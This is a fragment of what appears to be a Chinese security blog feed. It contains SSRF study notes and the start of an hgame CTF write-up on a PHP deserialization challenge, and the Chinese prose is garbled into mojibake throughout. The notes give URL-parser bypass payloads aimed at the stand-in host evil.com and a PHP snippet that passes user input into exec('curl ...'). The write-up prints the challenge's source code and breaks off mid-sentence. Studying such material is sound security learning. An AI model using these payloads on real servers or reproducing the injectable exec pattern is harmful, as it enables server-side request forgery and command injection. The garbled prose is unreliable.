·å¯¹äºcurlæ“ä½œï¼Œå‡å¦‚ä½¿ç”¨libcurl<br><img src="/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="lib_curl"><br>åˆ™å°†ç¬¬ä¸€ä¸ª<code>@</code>åçš„å±é™©ç½‘ç«™ç½®ä¸ºæ‰§è¡Œcurlçš„å¯¹è±¡ï¼Œè¾¾åˆ°æ¼æ´åˆ©ç”¨ã€‚<br>åŒæ ·æ•ˆæœçš„è¿˜æœ‰<code>;</code><br>å³<code>http://evil.com;google.com</code>ã€‚curlä¼šå°†<code>evil.com</code>å½“æˆ<br>hostname,è€Œå°†åé¢çš„<code>google.com</code>å½“åšquqerystringã€‚</p><p>æåˆ°curl,è¿˜å¯ä»¥æåˆ°åç«¯ä»£ç çš„ä¸€ç§å¸¸è§æ­é…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.filter_varå¯¹urlè¿›è¡Œcheck</span><br><span class="line">2.parse_urlè·å–urlçš„host</span><br><span class="line">3.å¯¹hostè¿›è¡Œæ­£åˆ™åŒ¹é…</span><br><span class="line">4.execæ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…³äºbypass <code>filter_var</code>åŠ<code>parse_url</code>ä¹Ÿæ˜¯æœ‰å¦™æ‹›çš„ï¼š<br>é¦–å…ˆæ˜¯ <code>filter_var</code>ï¼š<br>ä¸Šé¢è¯´åˆ°ï¼Œ<code>http://evil.com;google.com</code>æ˜¯å¯ä»¥æ‰§è¡Œcurlåˆ°å±é™©ç½‘ç«™çš„ã€‚ä½†æ˜¯å‡å¦‚åœ¨curlä¹‹å‰åŠ ä¸Š<code>filter_var</code>åè¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œæ›´æ”¹åè®®å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:&#x2F;&#x2F;evil.com;google.com</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·çš„è¯curlå¯èƒ½æ‰§è¡Œä¸äº†äº†ï¼Œæ‰€ä»¥æŠŠhostnameå¼ºè°ƒä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:&#x2F;&#x2F;evil.com:80;google.com:80</span><br></pre></td></tr></table></figure><p>åŠ ä¸Šç«¯å£å³å¯ã€‚</p><p>å…¶æ¬¡æ˜¯parse_urlï¼š<br>pase_urlå¹¶ä¸éœ€è¦å®Œå…¨ç»•è¿‡hostnameã€‚å› ä¸ºparse_urlçš„ä½œç”¨åªæ˜¯å°†ä¸€ä¸ªç»™å®šurlåˆ†æˆä¸Šé¢æåˆ°çš„<code>scheme,hostnameï¼Œport,path</code>å‡ éƒ¨åˆ†ã€‚æ‰€ä»¥ä¸‹é¢è¿™ä¸ªpaylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:&#x2F;&#x2F;evil$google.com</span><br></pre></td></tr></table></figure><p>åœ¨ç»è¿‡<code>parse_url</code>åï¼Œ<code>hostname</code>ä»ä¸ºevil$google.comã€‚ä½†æ˜¯å½“æºç ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ—¶ï¼Œbashä¼šå°†åé¢çš„<code>$google.com</code>å½“åšä¸€ä¸ªå˜é‡å¹¶ç½®ä¸ºç©ºï¼Œæ‰€ä»¥<code>exec()</code>æ—¶ä»æ˜¯æŒ‡å‘<code>evil.com</code><br>ä½¿ç”¨å‰æï¼šç”¨<code>exec system</code>æ‰§è¡Œ<code>curl  wget</code>ä¹‹ç±»çš„ã€‚</p><p>ä»¥ä¸Šéƒ½æ˜¯curlå‡½æ•°çš„ssrfï¼Œé‚£ä¹ˆå¦‚æœæ˜¯<code>file_get_contents()</code>å‘¢ï¼š<br>æ¯”å¦‚åªå°†ä¸Šé¢<code>exec()</code>éƒ¨åˆ†å‡½æ•°æ”¹ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; get page from URL</span><br><span class="line">$a &#x3D; file_get_contents($argv[1]);</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥è€ƒè™‘åˆ°å¸¸å¸¸åˆ©ç”¨çš„å„ç§åè®®,æ¯”å¦‚dataåè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;google.com&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">I love PHP</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœæŠŠåé¢çš„base64éƒ¨åˆ†æ¢ä½œxssä»£ç ç¼–ç åçš„ç»“æœï¼Œå°±å¯ä»¥æ‰§è¡Œxssã€‚</p><p>å…ˆè¿™æ ·ã€‚ç”±äºè¿˜æ²¡æ¥è§¦åˆ°ssrfçš„é«˜çº§æ‹“å±•åœºæ™¯ï¼Œç­‰æ—¥åæ¥è§¦åˆ°å†å†™ä¸€ç¯‡é«˜çº§åˆ©ç”¨ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p><p><a href="https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­ç”µhgame-week3</title>
      <link href="2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/"/>
      <url>2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/</url>
      
        <content type="html"><![CDATA[<p>  week3çš„éš¾åº¦æ›´ä¸Šä¸€å±‚æ¥¼ã€‚æœä¸å…¶ç„¶akæ‰webçš„flagå€’äº†ï¼Œæœ€åè¿˜æ˜¯å·®ä¸€é“é¢˜(å…¶å®æ˜¯å› ä¸ºxssèŠ±äº†å¤ªå¤šæ—¶é—´æ²¡åšå‡ºæ¥è‡ªé—­äº†ä¸æƒ³åšäº†)æ€»è€Œè¨€ä¹‹æ”¶è·ä¸å°ï¼Œä¹Ÿå¤´ä¸€æ¬¡æ„Ÿå—åˆ°é«˜æ‰‹åˆ‡ç£‹çš„æ„æ€ã€‚ä¸‹ä¸ªweekä¼°è®¡ä¸ä¼šå†èŠ±è¿™ä¹ˆå¤šæ—¶é—´åšé¢˜äº†ã€‚å¹²è„†å†™ä¸‹æ¬ ç€çš„ç¬”è®°ä»¥åŠå…¶ä»–äº‹å§ã€‚</p><a id="more"></a><h1 id="åºåˆ—ä¹‹äº‰-Ordinal-Scale"><a href="#åºåˆ—ä¹‹äº‰-Ordinal-Scale" class="headerlink" title="åºåˆ—ä¹‹äº‰ - Ordinal Scale"></a>åºåˆ—ä¹‹äº‰ - Ordinal Scale</h1><p>å…¶å®è¿™é“ååºåˆ—åŒ–åº”è¯¥æ˜¯å‡ºç»™è¿™ä¸ªweekçš„ç­¾åˆ°é¢˜ï¼Œå¯æƒœè‡ªå·±å¤ªèœäº†â€¦â€¦ååºåˆ—åŒ–æœç„¶è¿˜æ˜¯è¦å¥½å¥½ç ”ç©¶ä¸€ä¸‹å•Šã€‚å¥½åœ¨æœ€åè¿˜æ˜¯åšå‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜ä½“ä¼šåˆ°ä¸å°‘ååºåˆ—åŒ–çš„è¶£å‘³æ€§ã€‚çœ‹æ¥æ˜¯åº”è¯¥å¥½å¥½ç ”ç©¶ä¸€ç•ªäº†ï¼š<br>é¦–å…ˆæºç æç¤ºsource.zip,æˆ‘ä»¬çœ‹ä¸‹æºç ä¸­æœ‰ç”¨çš„éƒ¨åˆ†ï¼š<br>game.php(ç•¥æ‰æ— ç”¨éƒ¨åˆ†)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">'cardinal.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'player'</span>]))&#123;</span><br><span class="line">        $playerName = $_SESSION[<span class="string">'player'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $playerName = $_POST[<span class="string">'player'</span>] ?? <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>($playerName === <span class="string">''</span> || is_array($playerName))&#123;</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $game = <span class="keyword">new</span> Game($playerName);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å½“å‰æ’å: <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($game-&gt;rank-&gt;Get());<span class="meta">?&gt;</span></span><br><span class="line">      ç»éªŒ: <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($_SESSION[<span class="string">'exp'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($game-&gt;welcomeMsg);<span class="meta">?&gt;</span></span><br><span class="line">     <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($game-&gt;rank-&gt;Get());<span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span>($game-&gt;rank-&gt;Get() === <span class="number">1</span>)&#123;<span class="meta">?&gt;</span></span><br><span class="line">hgame&#123;flag_is_here&#125;</span><br></pre></td></tr></table></figure><p>cardinal.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($playerName)</span></span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'player'</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;     <span class="comment">// æœåŠ¡å™¨çš„ Key</span></span><br><span class="line">    <span class="keyword">private</span> $key = <span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">'rank'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">($no)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Fight</span><span class="params">($monster)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($monster[<span class="string">'no'</span>] &gt;= <span class="keyword">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rank -= rand(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rank &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rank = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] += rand(<span class="number">20</span>, <span class="number">200</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="keyword">true</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:green;"&gt;Congratulations! You win! &lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="keyword">false</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:red;"&gt;You die!&lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'rank'</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// éæ­£å¸¸è®¿é—®</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monster</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $monsterData;</span><br><span class="line">    <span class="keyword">private</span> $encryptKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $monsterName = [<span class="string">'æ— åå°æ€ª'</span>, <span class="string">'BOSS: The Kernal Cosmos'</span>, <span class="string">'å°æ€ª: Big Eggplant'</span>, <span class="string">'BOSS: The Mole King'</span>, <span class="string">'BOSS: Zero Zone Witch'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monsterData = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'name'</span> =&gt; $monsterName[array_rand($monsterName, <span class="number">1</span>)],</span><br><span class="line">            <span class="string">'no'</span> =&gt; rand(<span class="number">1</span>, <span class="number">2000</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªæ•´é½çš„ç±»ï¼Œæ˜¾ç„¶æ˜¯phpååºåˆ—åŒ–äº†ã€‚é¦–å…ˆæ•´ç†ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬è¾“å…¥åå­—åå¼€å§‹æ¸¸æˆï¼Œè¿™æ—¶åªè¦<code>$game-&gt;rank-&gt;Get() === 1</code>å³å¯æ‹¿åˆ°flagã€‚é‚£ä¹ˆé¦–å…ˆè·Ÿéšä¸‹æµç¨‹å§ã€‚</p><p>é‡ç‚¹å…ˆæ”¾åœ¨cardinal.phpä¸Šã€‚è¾“å…¥åå­—åï¼Œä¼šå®ä¾‹åŒ–Gameå¯¹è±¡ï¼Œè€Œåœ¨Gameç±»ä¸­ï¼Œå…ˆåå®ä¾‹åŒ–Monsterç±»ä¸Rankç±»å¯¹è±¡ã€‚å…¶ä¸­monsterç±»çš„å®ä¾‹åŒ–ç”¨åˆ°äº†ä¸€ä¸ª<code>init()</code>å‡½æ•°ã€‚é‡ç‚¹å…³æ³¨ä¸‹è¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>sprintf()</code>å‡½æ•°å¯ä»¥åˆ©ç”¨ã€‚ç”±äºsprintf()ä½œç”¨æ˜¯å°†æ 